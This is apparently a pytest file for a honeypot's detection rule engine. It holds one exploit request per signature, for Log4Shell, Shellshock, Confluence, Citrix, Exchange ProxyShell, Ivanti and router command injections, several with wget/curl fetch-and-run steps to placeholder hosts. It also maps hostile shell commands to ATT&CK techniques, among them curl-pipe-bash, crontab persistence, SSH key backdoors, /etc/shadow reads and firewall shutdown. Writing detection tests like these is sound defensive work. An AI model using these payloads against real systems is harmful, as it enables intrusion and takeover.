from datetime import datetime, timezone

import pytest

from honeyjar.config import RULES_DIR
from honeyjar.rules import RuleEngine
from honeyjar.schemas import Event

ENGINE = RuleEngine(RULES_DIR)


def http(path="/", method="GET", headers=None, body=""):
    headers = {k.lower(): v for k, v in (headers or {}).items()}
    return Event(ts=datetime.now(timezone.utc), sensor_id="t", honeypot="http", event_type="http_request",
                 src_ip="203.0.113.5", http_method=method, http_path=path, http_raw_path=path,
                 http_headers=headers, http_ua=headers.get("user-agent"), http_body=body)


def shell(cmd):
    return Event(ts=datetime.now(timezone.utc), sensor_id="t", honeypot="cowrie", event_type="command",
                 src_ip="203.0.113.5", command=cmd)


# One realistic exploit request per signature, modelled on public PoCs / observed traffic.
POSITIVE = {
    "log4shell": http("/?x=${jndi:ldap://198.51.100.7:1389/a}", headers={"User-Agent": "${${lower:j}ndi:ldap://x/a}"}),
    "shellshock": http("/cgi-bin/test.cgi", headers={"User-Agent": "() { :; }; /bin/bash -c 'id'"}),
    "phpunit-eval-stdin": http("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "POST", body="<?php echo md5('x');"),
    "php-cgi-arg-injection": http("/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "POST"),
    "thinkphp-invokefunction": http("/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=x"),
    "laravel-ignition": http("/_ignition/execute-solution", "POST", body='{"solution":"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution"}'),
    "apache-path-traversal-41773": http("/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", "POST", body="echo;id"),
    "apache-path-traversal-42013": http("/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh", "POST", body="echo;id"),
    "struts2-content-type-ognl": http("/index.action", headers={"Content-Type": "%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}"}),
    "spring4shell": http("/", "POST", body="class.module.classLoader.resources.context.parent.pipeline.first.pattern=x"),
    "confluence-ognl-2022": http("/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/"),
    "confluence-template-2023": http("/template/aui/text-inline.vm", "POST", body="label=\\u0027%2b#request.get(\\u0027.KEY_velocity\\u0027)"),
    "confluence-ognl-2021": http("/pages/createpage-entervariables.action", "POST", body="queryString=aaa\\u0027%2b{233*233}%2b\\u0027bbb"),
    "panos-globalprotect": http("/ssl-vpn/hipreport.esp", "POST", headers={"Cookie": "SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/aaa`curl${IFS}x`"}),
    "ivanti-auth-bypass": http("/api/v1/totp/user-backup-code/../../system/system-information"),
    "ivanti-cmd-injection": http("/api/v1/totp/user-backup-code/../../license/keys-status/%3bpython%20-c%20x"),
    "pulse-secure-file-read": http("/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"),
    "fortios-path-traversal": http("/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"),
    "fortios-auth-bypass": http("/api/v2/cmdb/system/admin/admin", "PUT", headers={"User-Agent": "Report Runner", "Forwarded": 'for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";'}),
    "citrix-adc-traversal": http("/vpn/../vpns/portal/scripts/newbm.pl", "POST", headers={"NSC_USER": "../../../netscaler/portal/templates/x"}),
    "citrix-bleed": http("/oauth/idp/.well-known/openid-configuration", headers={"Host": "a" * 24812}),
    "f5-bigip-icontrol": http("/mgmt/tm/util/bash", "POST", headers={"X-F5-Auth-Token": "", "Connection": "keep-alive, X-F5-Auth-Token"}, body='{"command":"run","utilCmdArgs":"-c id"}'),
    "f5-bigip-tmui": http("/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"),
    "exchange-proxyshell": http("/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com"),
    "exchange-proxynotshell": http("/autodiscover/autodiscover.json?a@foo.var/owa/&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"),
    "exchange-proxylogon": http("/ecp/y.js", headers={"Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;"}),
    "moveit-sqli": http("/moveitisapi/moveitisapi.dll?action=m2", "POST"),
    "vcenter-uploadova": http("/ui/vropspluginui/rest/services/uploadova", "POST"),
    "gpon-rce": http("/GponForm/diag_Form?images/", "POST", body="XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://1.2.3.4/x`;sh"),
    "huawei-hg532": http("/ctrlt/DeviceUpgrade_1", "POST", body="<NewStatusURL>$(/bin/busybox wget -g 1.2.3.4 -l /tmp/x -r /mips)</NewStatusURL>"),
    "realtek-sdk-miniigd": http("/picsdesc.xml", "POST", body="<NewInternalClient>`cd /var; wget http://1.2.3.4/x`</NewInternalClient>"),
    "tplink-archer-ax21": http("/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>/tmp/x)"),
    "netgear-cgi-semicolon": http("/cgi-bin/;cd${IFS}/var/tmp;wget${IFS}http://1.2.3.4/x"),
    "hikvision-weblanguage": http("/SDK/webLanguage", "PUT", body="<language>$(id>webLib/x)</language>"),
    "dlink-getuser": http("/config/getuser?index=0"),
    "lblink-limitclient": http("/goform/set_LimitClient_cfg", "POST", body="time1=00:00-00:00&mac=;wget http://1.2.3.4/x;"),
    "zyxel-ztp": http("/ztp/cgi-bin/handler", "POST", body='{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; curl x;"}'),
    "draytek-vigor": http("/cgi-bin/mainfunction.cgi", "POST", body="action=login&keyPath=%27%0A%2fbin%2fid%0A%27&loginUser=a&loginPwd=a"),
    "jenkins-cli-file-read": http("/cli?remoting=false", "POST", headers={"Session": "x", "Side": "download"}),
    "geoserver-ognl": http("/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')"),
    # recon / generic tags
    "env-file": http("/.env"),
    "git-exposure": http("/.git/config"),
    "wordpress-login": http("/wp-login.php", "POST", body="log=admin&pwd=admin123"),
    "wordpress-scan": http("/wp-includes/wlwmanifest.xml"),
    "admin-panel": http("/phpmyadmin/"),
    "webshell-probe": http("/alfa.php"),
    "cmd-injection-generic": http("/cgi-bin/x?cmd=;wget+http://1.2.3.4/a"),
    "dropper-download": shell("cd /tmp; wget http://198.51.100.9/bins/mips; chmod +x mips; ./mips"),
    "path-traversal-generic": http("/static/../../../../etc/passwd"),
    "scanner-ua": http("/", headers={"User-Agent": "Mozilla/5.0 zgrab/0.x"}),
    "sql-injection-generic": http("/item.php?id=1 UNION ALL SELECT NULL,NULL--"),
}


def test_every_rule_has_a_fixture():
    assert {r.id for r in ENGINE.sig_rules} == set(POSITIVE)


@pytest.mark.parametrize("rule_id", sorted(POSITIVE))
def test_rule_matches_its_exploit(rule_id):
    rule = next(r for r in ENGINE.sig_rules if r.id == rule_id)
    cves, tags = ENGINE.match_signatures(POSITIVE[rule_id])
    assert (rule.cve in cves) if rule.cve else (rule.tag in tags)


BENIGN = [
    http("/"),
    http("/index.html", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0"}),
    http("/robots.txt"),
    http("/favicon.ico"),
    http("/api/v1/users"),
    http("/search?q=how+to+configure+log4j"),
    http("/login", "POST", body="username=alice&password=hunter2"),
    http("/wp-login.php"),  # GET is recon at most, not brute force
    shell("ls -la"),
]


@pytest.mark.parametrize("ev", BENIGN, ids=lambda e: e.http_path or e.command)
def test_benign_requests_have_no_cve(ev):
    cves, _ = ENGINE.match_signatures(ev)
    assert cves == []


def test_http_exploit_is_promoted_to_exploit_event():
    ev = ENGINE.apply(POSITIVE["log4shell"])
    assert ev.event_type == "exploit" and ev.cves == ["CVE-2021-44228"]


@pytest.mark.parametrize("cmd,technique", [
    ("uname -a", "T1082"),
    ("cat /proc/cpuinfo | grep name | wc -l", "T1082"),
    ("whoami", "T1033"),
    ("cd /tmp && wget http://1.2.3.4/x.sh && sh x.sh", "T1105"),
    ("curl -s http://1.2.3.4/a | bash", "T1059.004"),
    ("chmod +x .s", "T1222.002"),
    ("(crontab -l; echo '* * * * * /tmp/.x') | crontab -", "T1053.003"),
    ("echo ssh-rsa AAAA >> ~/.ssh/authorized_keys", "T1098.004"),
    ('echo "root:Xyz123"|chpasswd', "T1098"),
    ("history -c; rm -rf ~/.bash_history", "T1070.003"),
    ("./xmrig -o stratum+tcp://pool.example:3333", "T1496"),
    ("echo ZWNobyBoaQ== | base64 -d | sh", "T1140"),
    ("systemctl stop firewalld", "T1562.001"),
    ("cat /etc/shadow", "T1003.008"),
    ("useradd -m backup", "T1136.001"),
])
def test_attack_mapping(cmd, technique):
    assert technique in ENGINE.map_techniques(shell(cmd))


def test_login_events_map_to_brute_force_and_valid_accounts():
    ev = shell("")
    ev.event_type, ev.command = "login_attempt", None
    ev.login_success = False
    assert ENGINE.map_techniques(ev) == ["T1110.001"]
    ev.login_success = True
    assert ENGINE.map_techniques(ev) == ["T1078"]
